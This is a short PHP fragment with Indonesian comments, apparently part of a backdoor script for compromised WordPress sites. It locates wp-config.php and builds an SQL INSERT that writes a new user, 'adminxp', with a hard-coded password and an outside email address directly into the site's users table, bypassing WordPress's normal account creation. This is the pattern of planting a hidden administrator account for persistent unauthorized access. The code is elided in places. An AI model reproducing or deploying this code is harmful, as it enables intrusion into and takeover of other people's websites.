...
$user = 'adminxp'; // Ganti dengan nama pengguna yang Anda inginkan
$user_password = 'fxp123$'; // Ganti dengan kata sandi yang Anda inginkan
$email = 'unknownxp1337@gmail.com'; // Ganti dengan alamat email yang Anda inginkan
...
if (file_exists($wp_config_path)) {
    ...
    $sqlInsertUser = "INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_status, user_registered, user_nicename) VALUES ('$user', MD5('$user_password'), '$email', '0', '2022-09-09 05:42:56', 'Sysfxp47 only')";
